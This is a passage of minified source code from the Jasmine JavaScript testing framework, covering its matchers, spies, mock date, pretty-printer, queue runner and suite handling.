a(){return{compare:function(a){return{pass:!a}}}}return a},getJasmineRequireObj().toBeGreaterThan=function(){function a(){return{compare:function(a,b){return{pass:a>b}}}}return a},getJasmineRequireObj().toBeGreaterThanOrEqual=function(){function a(){return{compare:function(a,b){return{pass:a>=b}}}}return a},getJasmineRequireObj().toBeLessThan=function(){function a(){return{compare:function(a,b){return{pass:a<b}}}}return a},getJasmineRequireObj().toBeLessThanOrEqual=function(){function a(){return{compare:function(a,b){return{pass:a<=b}}}}return a},getJasmineRequireObj().toBeNaN=function(a){function b(){return{compare:function(b){var c={pass:b!==b};return c.pass?c.message="Expected actual not to be NaN.":c.message=function(){return"Expected "+a.pp(b)+" to be NaN."},c}}}return b},getJasmineRequireObj().toBeNegativeInfinity=function(a){function b(){return{compare:function(b){var c={pass:b===Number.NEGATIVE_INFINITY};return c.pass?c.message="Expected actual to be -Infinity.":c.message=function(){return"Expected "+a.pp(b)+" not to be -Infinity."},c}}}return b},getJasmineRequireObj().toBeNull=function(){function a(){return{compare:function(a){return{pass:null===a}}}}return a},getJasmineRequireObj().toBePositiveInfinity=function(a){function b(){return{compare:function(b){var c={pass:b===Number.POSITIVE_INFINITY};return c.pass?c.message="Expected actual to be Infinity.":c.message=function(){return"Expected "+a.pp(b)+" not to be Infinity."},c}}}return b},getJasmineRequireObj().toBeTruthy=function(){function a(){return{compare:function(a){return{pass:!!a}}}}return a},getJasmineRequireObj().toBeUndefined=function(){function a(){return{compare:function(a){return{pass:void 0===a}}}}return a},getJasmineRequireObj().toContain=function(){function a(a,b){return b=b||[],{compare:function(c,d){return{pass:a.contains(c,d,b)}}}}return a},getJasmineRequireObj().toEqual=function(a){function b(b,c){return c=c||[],{compare:function(d,e){var f={pass:!1},g=a.DiffBuilder();return f.pass=b.equals(d,e,c,g),f.message=g.getMessage(),f}}}return b},getJasmineRequireObj().toHaveBeenCalled=function(a){function b(){return{compare:function(b){var d={};if(!a.isSpy(b))throw new Error(c("Expected a spy, but got "+a.pp(b)+"."));if(arguments.length>1)throw new Error(c("Does not take arguments, use toHaveBeenCalledWith"));return d.pass=b.calls.any(),d.message=d.pass?"Expected spy "+b.and.identity+" not to have been called.":"Expected spy "+b.and.identity+" to have been called.",d}}}var c=a.formatErrorMsg("<toHaveBeenCalled>","expect(<spyObj>).toHaveBeenCalled()");return b},getJasmineRequireObj().toHaveBeenCalledBefore=function(a){function b(){return{compare:function(b,d){if(!a.isSpy(b))throw new Error(c("Expected a spy, but got "+a.pp(b)+"."));if(!a.isSpy(d))throw new Error(c("Expected a spy, but got "+a.pp(d)+"."));var e={pass:!1};if(!b.calls.count())return e.message="Expected spy "+b.and.identity+" to have been called.",e;if(!d.calls.count())return e.message="Expected spy "+d.and.identity+" to have been called.",e;var f=b.calls.mostRecent().invocationOrder,g=d.calls.first().invocationOrder;if(e.pass=f<g,e.pass)e.message="Expected spy "+b.and.identity+" to not have been called before spy "+d.and.identity+", but it was";else{var h=b.calls.first().invocationOrder,i=d.calls.mostRecent().invocationOrder;e.message=h<g?"Expected latest call to spy "+b.and.identity+" to have been called before first call to spy "+d.and.identity+" (no interleaved calls)":i>f?"Expected first call to spy "+d.and.identity+" to have been called after latest call to spy "+b.and.identity+" (no interleaved calls)":"Expected spy "+b.and.identity+" to have been called before spy "+d.and.identity}return e}}}var c=a.formatErrorMsg("<toHaveBeenCalledBefore>","expect(<spyObj>).toHaveBeenCalledBefore(<spyObj>)");return b},getJasmineRequireObj().toHaveBeenCalledTimes=function(a){function b(){return{compare:function(b,d){if(!a.isSpy(b))throw new Error(c("Expected a spy, but got "+a.pp(b)+"."));var e=Array.prototype.slice.call(arguments,0),f={pass:!1};if(!a.isNumber_(d))throw new Error(c("The expected times failed is a required argument and must be a number."));b=e[0];var g=b.calls.count(),h=1===d?"once":d+" times";return f.pass=g===d,f.message=f.pass?"Expected spy "+b.and.identity+" not to have been called "+h+". It was called "+g+" times.":"Expected spy "+b.and.identity+" to have been called "+h+". It was called "+g+" times.",f}}}var c=a.formatErrorMsg("<toHaveBeenCalledTimes>","expect(<spyObj>).toHaveBeenCalledTimes(<Number>)");return b},getJasmineRequireObj().toHaveBeenCalledWith=function(a){function b(b,d){return{compare:function(){var e=Array.prototype.slice.call(arguments,0),f=e[0],g=e.slice(1),h={pass:!1};if(!a.isSpy(f))throw new Error(c("Expected a spy, but got "+a.pp(f)+"."));return f.calls.any()?(b.contains(f.calls.allArgs(),g,d)?(h.pass=!0,h.message=function(){return"Expected spy "+f.and.identity+" not to have been called with "+a.pp(g)+" but it was."}):h.message=function(){return"Expected spy "+f.and.identity+" to have been called with "+a.pp(g)+" but actual calls were "+a.pp(f.calls.allArgs()).replace(/^\[ | \]$/g,"")+"."},h):(h.message=function(){return"Expected spy "+f.and.identity+" to have been called with "+a.pp(g)+" but it was never called."},h)}}}var c=a.formatErrorMsg("<toHaveBeenCalledWith>","expect(<spyObj>).toHaveBeenCalledWith(...arguments)");return b},getJasmineRequireObj().toHaveClass=function(a){function b(b,d){return{compare:function(b,d){if(!c(b))throw new Error(a.pp(b)+" is not a DOM element");return{pass:b.classList.contains(d)}}}}function c(b){return b&&b.classList&&a.isFunction_(b.classList.contains)}return b},getJasmineRequireObj().toMatch=function(a){function b(){return{compare:function(b,d){if(!a.isString_(d)&&!a.isA_("RegExp",d))throw new Error(c("Expected is not a String or a RegExp"));return{pass:new RegExp(d).test(b)}}}}var c=a.formatErrorMsg("<toMatch>","expect(<expectation>).toMatch(<string> || <regexp>)");return b},getJasmineRequireObj().toThrow=function(a){function b(b){return{compare:function(d,e){var f,g={pass:!1},h=!1;if("function"!=typeof d)throw new Error(c("Actual is not a Function"));try{d()}catch(a){h=!0,f=a}return h?1==arguments.length?(g.pass=!0,g.message=function(){return"Expected function not to throw, but it threw "+a.pp(f)+"."},g):(b.equals(f,e)?(g.pass=!0,g.message=function(){return"Expected function not to throw "+a.pp(e)+"."}):g.message=function(){return"Expected function to throw "+a.pp(e)+", but it threw "+a.pp(f)+"."},g):(g.message="Expected function to throw an exception.",g)}}}var c=a.formatErrorMsg("<toThrow>","expect(function() {<expectation>}).toThrow()");return b},getJasmineRequireObj().toThrowError=function(a){function b(){function b(){var a,b;if(arguments[2]){if(b=arguments[1],a=arguments[2],!i(b))throw new Error(e("Expected error type is not an Error."));return g(a,b)}return arguments[1]?(a=arguments[1],i(arguments[1])?g(null,arguments[1]):g(arguments[1],null)):f()}function f(){return{match:function(b){return c("Expected function not to throw an Error, but it threw "+a.fnNameFor(b)+".")}}}function g(b,f){function g(a){return"string"==typeof b?b==a:b.test(a)}function i(c){var d=f?a.fnNameFor(c.constructor):"an exception",e="";return b&&(e=" with message "+a.pp(c.message)),d+e}function j(){return null===b?"":b instanceof RegExp?" with a message matching "+a.pp(b):" with message "+a.pp(b)}function k(a){return(null===f||a instanceof f)&&(null===b||g(a.message))}if(b&&!h(b))throw f?new Error(e("Expected error message is not a string or RegExp.")):new Error(e("Expected is not an Error, string, or RegExp."));var l=f?a.fnNameFor(f):"an exception";return{match:function(a){return k(a)?c(function(){return"Expected function not to throw "+l+j()+"."}):d(function(){return"Expected function to throw "+l+j()+", but it threw "+i(a)+"."})}}}function h(a){return a instanceof RegExp||"string"==typeof a}function i(b){if("function"!=typeof b)return!1;var c=function(){};return c.prototype=b.prototype,a.isError_(new c)}return{compare:function(c){var f,g=b.apply(null,arguments);if("function"!=typeof c)throw new Error(e("Actual is not a Function"));try{return c(),d("Expected function to throw an Error.")}catch(a){f=a}return a.isError_(f)?g.match(f):d(function(){return"Expected function to throw an Error, but it threw "+a.pp(f)+"."})}}}function c(a){return{pass:!0,message:a}}function d(a){return{pass:!1,message:a}}var e=a.formatErrorMsg("<toThrowError>","expect(function() {<expectation>}).toThrowError(<ErrorConstructor>, <message>)");return b},getJasmineRequireObj().toThrowMatching=function(a){function b(){return{compare:function(a,b){var g;if("function"!=typeof a)throw new Error(f("Actual is not a Function"));if("function"!=typeof b)throw new Error(f("Predicate is not a Function"));try{return a(),e("Expected function to throw an exception.")}catch(a){g=a}return b(g)?d("Expected function not to throw an exception matching a predicate."):e(function(){return"Expected function to throw an exception matching a predicate, but it threw "+c(g)+"."})}}}function c(b){return b&&b.constructor?a.fnNameFor(b.constructor)+" with message "+a.pp(b.message):a.pp(b)}function d(a){return{pass:!0,message:a}}function e(a){return{pass:!1,message:a}}var f=a.formatErrorMsg("<toThrowMatching>","expect(function() {<expectation>}).toThrowMatching(<Predicate>)");return b},getJasmineRequireObj().MockDate=function(){function a(a){function b(){switch(arguments.length){case 0:return new e(d);case 1:return new e(arguments[0]);case 2:return new e(arguments[0],arguments[1]);case 3:return new e(arguments[0],arguments[1],arguments[2]);case 4:return new e(arguments[0],arguments[1],arguments[2],arguments[3]);case 5:return new e(arguments[0],arguments[1],arguments[2],arguments[3],arguments[4]);case 6:return new e(arguments[0],arguments[1],arguments[2],arguments[3],arguments[4],arguments[5]);default:return new e(arguments[0],arguments[1],arguments[2],arguments[3],arguments[4],arguments[5],arguments[6])}}var c=this,d=0;if(!a||!a.Date)return c.install=function(){},c.tick=function(){},c.uninstall=function(){},c;var e=a.Date;return c.install=function(c){d=c instanceof e?c.getTime():(new e).getTime(),a.Date=b},c.tick=function(a){a=a||0,d+=a},c.uninstall=function(){d=0,a.Date=e},function(){b.prototype=e.prototype,b.now=function(){if(e.now)return d;throw new Error("Browser does not support Date.now()")},b.toSource=e.toSource,b.toString=e.toString,b.parse=e.parse,b.UTC=e.UTC}(),c}return a},getJasmineRequireObj().pp=function(a){function b(){this.ppNestLevel_=0,this.seen=[],this.length=0,this.stringParts=[]}function c(b){return a.isFunction_(b.toString)&&b.toString!==Object.prototype.toString&&b.toString()!==Object.prototype.toString.call(b)}function d(a,b){return a.length<=b?{value:a,truncated:!1}:(a=a.substring(0,b-4)+" ...",{value:a,truncated:!0})}function e(){this.message="Exceeded "+a.MAX_PRETTY_PRINT_CHARS+" characters while pretty-printing a value"}function f(b,c){var d=Object.keys?Object.keys(b):function(b){var c=[];for(var d in b)a.util.has(b,d)&&c.push(d);return c}(b);if(!c)return d;if(0===d.length)return d;for(var e=[],f=0;f<d.length;f++)/^[0-9]+$/.test(d[f])||e.push(d[f]);return e}return b.prototype.format=function(b){this.ppNestLevel_++;try{a.util.isUndefined(b)?this.emitScalar("undefined"):null===b?this.emitScalar("null"):0===b&&1/b==-1/0?this.emitScalar("-0"):b===a.getGlobal()?this.emitScalar("<global>"):b.jasmineToString?this.emitScalar(b.jasmineToString()):"string"==typeof b?this.emitString(b):a.isSpy(b)?this.emitScalar("spy on "+b.and.identity):b instanceof RegExp?this.emitScalar(b.toString()):"function"==typeof b?this.emitScalar("Function"):1===b.nodeType?this.emitDomElement(b):"number"==typeof b.nodeType?this.emitScalar("HTMLNode"):b instanceof Date?this.emitScalar("Date("+b+")"):a.isSet(b)?this.emitSet(b):a.isMap(b)?this.emitMap(b):a.isTypedArray_(b)?this.emitTypedArray(b):b.toString&&"object"==typeof b&&!a.isArray_(b)&&c(b)?this.emitScalar(b.toString()):a.util.arrayContains(this.seen,b)?this.emitScalar("<circular reference: "+(a.isArray_(b)?"Array":"Object")+">"):a.isArray_(b)||a.isA_("Object",b)?(this.seen.push(b),a.isArray_(b)?this.emitArray(b):this.emitObject(b),this.seen.pop()):this.emitScalar(b.toString())}catch(a){if(this.ppNestLevel_>1||!(a instanceof e))throw a}finally{this.ppNestLevel_--}},b.prototype.iterateObject=function(b,c){var d=f(b,a.isArray_(b)),e=function(a){};b.__lookupGetter__&&(e=function(c){var d=b.__lookupGetter__(c);return!a.util.isUndefined(d)&&null!==d});for(var g=Math.min(d.length,a.MAX_PRETTY_PRINT_ARRAY_LENGTH),h=0;h<g;h++){var i=d[h];c(i,e(i))}return d.length>g},b.prototype.emitScalar=function(a){this.append(a)},b.prototype.emitString=function(a){this.append("'"+a+"'")},b.prototype.emitArray=function(b){if(this.ppNestLevel_>a.MAX_PRETTY_PRINT_DEPTH)return void this.append("Array");var c=Math.min(b.length,a.MAX_PRETTY_PRINT_ARRAY_LENGTH);this.append("[ ");for(var d=0;d<c;d++)d>0&&this.append(", "),this.format(b[d]);b.length>c&&this.append(", ...");var e=this,f=0===b.length;this.iterateObject(b,function(a,c){f?f=!1:e.append(", "),e.formatProperty(b,a,c)})&&this.append(", ..."),this.append(" ]")},b.prototype.emitSet=function(b){if(this.ppNestLevel_>a.MAX_PRETTY_PRINT_DEPTH)return void this.append("Set");this.append("Set( ");var c=Math.min(b.size,a.MAX_PRETTY_PRINT_ARRAY_LENGTH),d=0;b.forEach(function(a,b){d>=c||(d>0&&this.append(", "),this.format(a),d++)},this),b.size>c&&this.append(", ..."),this.append(" )")},b.prototype.emitMap=function(b){if(this.ppNestLevel_>a.MAX_PRETTY_PRINT_DEPTH)return void this.append("Map");this.append("Map( ");var c=Math.min(b.size,a.MAX_PRETTY_PRINT_ARRAY_LENGTH),d=0;b.forEach(function(a,b){d>=c||(d>0&&this.append(", "),this.format([b,a]),d++)},this),b.size>c&&this.append(", ..."),this.append(" )")},b.prototype.emitObject=function(b){var c,d=b.constructor;if(c="function"==typeof d&&b instanceof d?a.fnNameFor(b.constructor):"null",this.append(c),!(this.ppNestLevel_>a.MAX_PRETTY_PRINT_DEPTH)){var e=this;this.append("({ ");var f=!0;this.iterateObject(b,function(a,c){f?f=!1:e.append(", "),e.formatProperty(b,a,c)})&&this.append(", ..."),this.append(" })")}},b.prototype.emitTypedArray=function(b){var c=a.fnNameFor(b.constructor),d=Array.prototype.slice.call(b,0,a.MAX_PRETTY_PRINT_ARRAY_LENGTH),e=Array.prototype.join.call(d,", ");d.length!==b.length&&(e+=", ..."),this.append(c+" [ "+e+" ]")},b.prototype.emitDomElement=function(a){var b="</"+a.tagName.toLowerCase()+">";if(""===a.innerHTML)this.append(a.outerHTML.replace(b,""));else{var c=a.outerHTML.indexOf(">");this.append(a.outerHTML.substring(0,c+1)),this.append("..."+b)}},b.prototype.formatProperty=function(a,b,c){this.append(b),this.append(": "),c?this.append("<getter>"):this.format(a[b])},b.prototype.append=function(b){var c=d(b,a.MAX_PRETTY_PRINT_CHARS-this.length);if(this.length+=c.value.length,this.stringParts.push(c.value),c.truncated)throw new e},e.prototype=new Error,function(a){var c=new b;return c.format(a),c.stringParts.join("")}},getJasmineRequireObj().QueueRunner=function(a){function b(){}function c(a){var b=!1;return function(c){return b||(b=!0,a(c)),null}}function d(){}function e(b){var c=b.queueableFns||[];if(this.queueableFns=c.concat(b.cleanupFns||[]),this.firstCleanupIx=c.length,this.onComplete=b.onComplete||d,this.clearStack=b.clearStack||function(a){a()},this.onException=b.onException||d,this.userContext=b.userContext||new a.UserContext,this.timeout=b.timeout||{setTimeout:setTimeout,clearTimeout:clearTimeout},this.fail=b.fail||d,this.globalErrors=b.globalErrors||{pushListener:d,popListener:d},this.completeOnFirstError=!!b.completeOnFirstError,this.errored=!1,"function"!=typeof this.onComplete)throw new Error("invalid onComplete "+JSON.stringify(this.onComplete));this.deprecated=b.deprecated}return b.prototype=new Error,a.StopExecutionError=b,e.prototype.execute=function(){var a=this;this.handleFinalError=function(b){a.onException(b)},this.globalErrors.pushListener(this.handleFinalError),this.run(0)},e.prototype.skipToCleanup=function(a){a<this.firstCleanupIx?this.run(this.firstCleanupIx):this.run(a+1)},e.prototype.clearTimeout=function(b){Function.prototype.apply.apply(this.timeout.clearTimeout,[a.getGlobal(),[b]])},e.prototype.setTimeout=function(b,c){return Function.prototype.apply.apply(this.timeout.setTimeout,[a.getGlobal(),[b,c]])},e.prototype.attempt=function(d){function e(a){h.onException(a),h.errored=m=!0}function f(a){e(a),l()}var g,h=this,i=!0,j=function(a){e(a),l(a)},k=c(function(){void 0!==g&&h.clearTimeout(g),h.globalErrors.popListener(j)}),l=c(function(c){function e(){h.completeOnFirstError&&m?h.skipToCleanup(d):h.run(d+1)}k(),a.isError_(c)&&(c instanceof b||h.fail(c),h.errored=m=!0),i?h.setTimeout(e):e()}),m=!1,n=h.queueableFns[d];if(l.fail=function(){h.fail.apply(null,arguments),h.errored=m=!0,l()},h.globalErrors.pushListener(j),void 0!==n.timeout){var o=n.timeout||a.DEFAULT_TIMEOUT_INTERVAL;g=h.setTimeout(function(){e(new Error("Timeout - Async callback was not invoked within "+o+"ms "+(n.timeout?"(custom timeout)":"(set by jasmine.DEFAULT_TIMEOUT_INTERVAL)"))),l()},o)}try{if(0!==n.fn.length)return n.fn.call(h.userContext,l),i=!1,{completedSynchronously:!1};var p=n.fn.call(h.userContext);if(p&&a.isFunction_(p.then))return p.then(l,f),i=!1,{completedSynchronously:!1}}catch(a){e(a),h.errored=m=!0}return k(),{completedSynchronously:!0,errored:m}},e.prototype.run=function(a){var c,d=this.queueableFns.length,e=this;for(c=a;c<d;c++){var f=this.attempt(c);if(!f.completedSynchronously)return;if(e.errored=e.errored||f.errored,this.completeOnFirstError&&f.errored)return void this.skipToCleanup(c)}this.clearStack(function(){e.globalErrors.popListener(e.handleFinalError),
e.onComplete(e.errored&&new b)})},e},getJasmineRequireObj().ReportDispatcher=function(a){function b(b,c){function d(b,d){0===i.length&&null!==j&&i.push(j);var f=d[d.length-1];d=a.util.argsToArray(d).splice(0,d.length-1);for(var g=[],h=0;h<i.length;h++){e(g,i[h],b,d)}c({queueableFns:g,onComplete:f,isReporter:!0})}function e(b,c,d,e){var f=c[d];if(f){var g=a.util.cloneArgs(e);f.length<=1?b.push({fn:function(){return f.apply(c,g)}}):b.push({fn:function(a){return f.apply(c,g.concat([a]))}})}}for(var f=b||[],g=0;g<f.length;g++){var h=f[g];this[h]=function(a){return function(){d(a,arguments)}}(h)}var i=[],j=null;return this.addReporter=function(a){i.push(a)},this.provideFallbackReporter=function(a){j=a},this.clearReporters=function(){i=[]},this}return b},getJasmineRequireObj().interface=function(a,b){var c={describe:function(a,c){return b.describe(a,c)},xdescribe:function(a,c){return b.xdescribe(a,c)},fdescribe:function(a,c){return b.fdescribe(a,c)},it:function(){return b.it.apply(b,arguments)},xit:function(){return b.xit.apply(b,arguments)},fit:function(){return b.fit.apply(b,arguments)},beforeEach:function(){return b.beforeEach.apply(b,arguments)},afterEach:function(){return b.afterEach.apply(b,arguments)},beforeAll:function(){return b.beforeAll.apply(b,arguments)},afterAll:function(){return b.afterAll.apply(b,arguments)},expect:function(a){return b.expect(a)},expectAsync:function(a){return b.expectAsync(a)},pending:function(){return b.pending.apply(b,arguments)},fail:function(){return b.fail.apply(b,arguments)},spyOn:function(a,c){return b.spyOn(a,c)},spyOnProperty:function(a,c,d){return b.spyOnProperty(a,c,d)},spyOnAllFunctions:function(a){return b.spyOnAllFunctions(a)},jsApiReporter:new a.JsApiReporter({timer:new a.Timer}),jasmine:a};return a.addCustomEqualityTester=function(a){b.addCustomEqualityTester(a)},a.addMatchers=function(a){return b.addMatchers(a)},a.clock=function(){return b.clock},a.createSpy=function(a,c){return b.createSpy(a,c)},a.createSpyObj=function(a,c){return b.createSpyObj(a,c)},a.addSpyStrategy=function(a,c){return b.addSpyStrategy(a,c)},c},getJasmineRequireObj().Spy=function(a){function b(b,d,f){var g="function"==typeof d?d.length:0,h=function(a,b){switch(a){case 1:return function(a){return b.apply(this,arguments)};case 2:return function(a,c){return b.apply(this,arguments)};case 3:return function(a,c,d){return b.apply(this,arguments)};case 4:return function(a,c,d,e){return b.apply(this,arguments)};case 5:return function(a,c,d,e,f){return b.apply(this,arguments)};case 6:return function(a,c,d,e,f,g){return b.apply(this,arguments)};case 7:return function(a,c,d,e,f,g,h){return b.apply(this,arguments)};case 8:return function(a,c,d,e,f,g,h,i){return b.apply(this,arguments)};case 9:return function(a,c,d,e,f,g,h,i,j){return b.apply(this,arguments)};default:return function(){return b.apply(this,arguments)}}}(g,function(){return k.apply(this,Array.prototype.slice.call(arguments))}),i=new c({name:b,fn:d,getSpy:function(){return h},customStrategies:f}),j=new a.CallTracker,k=function(){var a={object:this,invocationOrder:e(),args:Array.prototype.slice.apply(arguments)};j.track(a);var b=i.exec(this,arguments);return a.returnValue=b,b};for(var l in d){if("and"===l||"calls"===l)throw new Error("Jasmine spies would overwrite the 'and' and 'calls' properties on the object being spied upon");h[l]=d[l]}return h.and=i.and,h.withArgs=function(){return i.withArgs.apply(i,arguments)},h.calls=j,h}function c(b){var c=new a.SpyStrategy(b),e=new d(function(){return new a.SpyStrategy(b)});this.and=c,this.exec=function(d,f){var g=e.get(f);if(!g){if(e.any()&&!c.isConfigured())throw new Error("Spy '"+b.name+"' receieved a call with arguments "+a.pp(Array.prototype.slice.call(f))+" but all configured strategies specify other arguments.");g=c}return g.exec(d,f)},this.withArgs=function(){return{and:e.getOrCreate(arguments)}}}function d(a){this.strategies=[],this.strategyFactory=a}var e=function(){var a=0;return function(){return a++}}();return d.prototype.any=function(){return this.strategies.length>0},d.prototype.getOrCreate=function(a){var b=this.get(a);return b||(b=this.strategyFactory(),this.strategies.push({args:a,strategy:b})),b},d.prototype.get=function(b){var c;for(c=0;c<this.strategies.length;c++)if(a.matchersUtil.equals(b,this.strategies[c].args))return this.strategies[c].strategy},b},getJasmineRequireObj().SpyFactory=function(a){function b(b){var c=this;this.createSpy=function(c,d){return a.Spy(c,d,b())},this.createSpyObj=function(b,d){(a.isObject_(b)||a.isArray_(b))&&a.util.isUndefined(d)&&(d=b,b="unknown");var e={},f=!1;if(a.isArray_(d))for(var g=0;g<d.length;g++)e[d[g]]=c.createSpy(b+"."+d[g]),f=!0;else if(a.isObject_(d))for(var h in d)d.hasOwnProperty(h)&&(e[h]=c.createSpy(b+"."+h),e[h].and.returnValue(d[h]),f=!0);if(!f)throw"createSpyObj requires a non-empty array or object of method names to create spies for";return e}}return b},getJasmineRequireObj().SpyRegistry=function(a){function b(b){b=b||{};var d=b.global||a.getGlobal(),e=b.createSpy,f=b.currentSpies||function(){return[]};this.allowRespy=function(a){this.respy=a},this.spyOn=function(b,g){if(a.util.isUndefined(b)||null===b)throw new Error(c("could not find an object to spy upon for "+g+"()"));if(a.util.isUndefined(g)||null===g)throw new Error(c("No method name supplied"));if(a.util.isUndefined(b[g]))throw new Error(c(g+"() method does not exist"));if(b[g]&&a.isSpy(b[g])){if(this.respy)return b[g];throw new Error(c(g+" has already been spied upon"))}var h=Object.getOwnPropertyDescriptor(b,g);if(h&&!h.writable&&!h.set)throw new Error(c(g+" is not declared writable or has no setter"));var i,j=b[g],k=e(g,j);return i=Object.prototype.hasOwnProperty.call(b,g)||b===d&&"onerror"===g?function(){b[g]=j}:function(){delete b[g]||(b[g]=j)},f().push({restoreObjectToOriginalState:i}),b[g]=k,k},this.spyOnProperty=function(b,c,d){if(d=d||"get",a.util.isUndefined(b))throw new Error("spyOn could not find an object to spy upon for "+c);if(a.util.isUndefined(c))throw new Error("No property name supplied");var g=a.util.getPropertyDescriptor(b,c);if(!g)throw new Error(c+" property does not exist");if(!g.configurable)throw new Error(c+" is not declared configurable");if(!g[d])throw new Error("Property "+c+" does not have access type "+d);if(a.isSpy(g[d]))throw new Error(c+" has already been spied upon");var h,i=a.util.clone(g),j=e(c,g[d]);return h=Object.prototype.hasOwnProperty.call(b,c)?function(){Object.defineProperty(b,c,i)}:function(){delete b[c]},f().push({restoreObjectToOriginalState:h}),g[d]=j,Object.defineProperty(b,c,g),j},this.spyOnAllFunctions=function(b){if(a.util.isUndefined(b))throw new Error("spyOnAllFunctions could not find an object to spy upon");for(var c in b)if(Object.prototype.hasOwnProperty.call(b,c)&&b[c]instanceof Function){var d=Object.getOwnPropertyDescriptor(b,c);(d.writable||d.set)&&d.configurable&&this.spyOn(b,c)}return b},this.clearSpies=function(){for(var a=f(),b=a.length-1;b>=0;b--){a[b].restoreObjectToOriginalState()}}}var c=a.formatErrorMsg("<spyOn>","spyOn(<object>, <methodName>)");return b},getJasmineRequireObj().SpyStrategy=function(a){function b(b){b=b||{},this.identity=b.name||"unknown",this.originalFn=b.fn||function(){},this.getSpy=b.getSpy||function(){},this.plan=this._defaultPlan=function(){};var d,e=b.customStrategies||{};for(d in e)a.util.has(e,d)&&!this[d]&&(this[d]=c(e[d]))}function c(b){return function(){var c=b.apply(null,arguments);if(!a.isFunction_(c))throw new Error("Spy strategy must return a function");return this.plan=c,this.getSpy()}}return b.prototype.exec=function(a,b){return this.plan.apply(a,b)},b.prototype.callThrough=function(){return this.plan=this.originalFn,this.getSpy()},b.prototype.returnValue=function(a){return this.plan=function(){return a},this.getSpy()},b.prototype.returnValues=function(){var a=Array.prototype.slice.call(arguments);return this.plan=function(){return a.shift()},this.getSpy()},b.prototype.throwError=function(a){var b=a instanceof Error?a:new Error(a);return this.plan=function(){throw b},this.getSpy()},b.prototype.callFake=function(b){if(!a.isFunction_(b)&&!a.isAsyncFunction_(b))throw new Error("Argument passed to callFake should be a function, got "+b);return this.plan=b,this.getSpy()},b.prototype.stub=function(a){return this.plan=function(){},this.getSpy()},b.prototype.isConfigured=function(){return this.plan!==this._defaultPlan},b},getJasmineRequireObj().StackTrace=function(a){function b(a){var b=a.stack.split("\n").filter(function(a){return""!==a}),d=e(a.message,b);d&&(this.message=d.message,b=d.remainder);var f=c(b);this.frames=f.frames,this.style=f.style}function c(a){var b=null,c=a.map(function(a){return d(g,function(c){var d,e=a.match(c.re);return e&&(d=e[c.fileLineColIx].match(/^(.*):(\d+):\d+$/))?(b=b||c.style,{raw:a,file:d[1],line:parseInt(d[2],10),func:e[c.fnIx]}):null})||{raw:a}});return{style:b,frames:c}}function d(a,b){var c,d;for(c=0;c<a.length;c++)if(d=b(a[c]))return d}function e(a,b){var c=f(a,b);if(c>0)return{message:b.slice(0,c).join("\n"),remainder:b.slice(c)}}function f(a,b){if(!b[0].match(/^Error/))return 0;var c,d=a.split("\n");for(c=1;c<d.length;c++)if(d[c]!==b[c])return 0;return d.length}var g=[{re:/^\s*at ([^\)]+) \(([^\)]+)\)$/,fnIx:1,fileLineColIx:2,style:"v8"},{re:/\s*at (.+)$/,fileLineColIx:1,style:"v8"},{re:/^(([^@\s]+)@)?([^\s]+)$/,fnIx:2,fileLineColIx:3,style:"webkit"}];return b},getJasmineRequireObj().Suite=function(a){function b(a){this.env=a.env,this.id=a.id,this.parentSuite=a.parentSuite,this.description=a.description,this.expectationFactory=a.expectationFactory,this.asyncExpectationFactory=a.asyncExpectationFactory,this.expectationResultFactory=a.expectationResultFactory,this.throwOnExpectationFailure=!!a.throwOnExpectationFailure,this.beforeFns=[],this.afterFns=[],this.beforeAllFns=[],this.afterAllFns=[],this.children=[],this.result={id:this.id,description:this.description,fullName:this.getFullName(),failedExpectations:[],deprecationWarnings:[]}}function c(a){for(var b=0;b<a.length;b++)a[b].fn=null}function d(a){return!a[0]}return b.prototype.expect=function(a){return this.expectationFactory(a,this)},b.prototype.expectAsync=function(a){return this.asyncExpectationFactory(a,this)},b.prototype.getFullName=function(){for(var a=[],b=this;b;b=b.parentSuite)b.parentSuite&&a.unshift(b.description);return a.join(" ")},b.prototype.pend=function(){this.markedPending=!0},b.prototype.beforeEach=function(a){this.beforeFns.unshift(a)},b.prototype.beforeAll=function(a){this.beforeAllFns.push(a)},b.prototype.afterEach=function(a){this.afterFns.unshift(a)},b.prototype.afterAll=function(a){this.afterAllFns.unshift(a)},b.prototype.cleanupBeforeAfter=function(){c(this.beforeAllFns),c(this.afterAllFns),c(this.beforeFns),c(this.afterFns)},b.prototype.addChild=function(a){this.children.push(a)},b.prototype.status=function(){return this.markedPending?"pending":this.result.failedExpectations.length>0?"failed":"passed"},b.prototype.canBeReentered=function(){return 0===this.beforeAllFns.length&&0===this.afterAllFns.length},b.prototype.getResult=function(){return this.result.status=this.status(),this.result},b.prototype.sharedUserContext=function(){return this.sharedContext||(this.sharedContext=this.parentSuite?this.parentSuite.clonedSharedUserContext():new a.UserContext),this.sharedContext},b.prototype.clonedSharedUserContext=function(){return a.UserContext.fromExisting(this.sharedUserContext())},b.prototype.onException=function(){if(!(arguments[0]instanceof a.errors.ExpectationFailed)){var b={matcherName:"",passed:!1,expected:"",actual:"",error:arguments[0]},c=this.expectationResultFactory(b);this.parentSuite||(c.globalErrorType="afterAll"),this.result.failedExpectations.push(c)}},b.prototype.addExpectationResult=function(){if(d(arguments)){var b=arguments[1];if(this.result.failedExpectations.push(this.expectationResultFactory(b)),this.throwOnExpectationFailure)throw new a.errors.ExpectationFailed}},b.prototype.addDeprecationWarning=function(a){"string"==typeof a&&(a={message:a}),this.result.deprecationWarnings.push(this.expectationResultFactory(a))},b},void 0==typeof window&&"object"==typeof exports&&(exports.Suite=jasmineRequire.Suite),getJasmineRequireObj().Timer=function(){function a(a){a=a||{};var c,d=a.now||b;this.start=function(){c=d()},this.elapsed=function(){return d()-c}}var b=function(a){return function(){return(new a).getTime()}}(Date);return a},getJasmineRequireObj().TreeProcessor=function(){function a(a){function b(a){for(var b=0;b<k.length;b++)if(k[b]===a)return b}function c(a,g){var h=b(a.id);if(void 0!==h&&(g=!1),a.children){for(var i=!1,j=o(a),k=0;k<j.length;k++){var l=j[k];if(c(l,g),!q.valid)return;var m=q[l.id];i=i||m.willExecute}q[a.id]={excluded:g,willExecute:i},f(a,j,q[a.id],h),!a.canBeReentered()&&q[a.id].segments.length>1&&(q={valid:!1})}else{var n=g||p(a);q[a.id]={excluded:n,willExecute:!n&&!a.markedPending,segments:[{index:0,owner:a,nodes:[a],min:d(h),max:e(h)}]}}}function d(a){return void 0===a?s:a}function e(a){return void 0===a?t:a}function f(a,b,c,f){for(var h={index:0,owner:a,nodes:[],min:d(f),max:e(f)},i=[h],j=t,k=g(b),l=0;l<k.length;l++){var m=k[l],n=m.max,o=m.min;(function(a){return 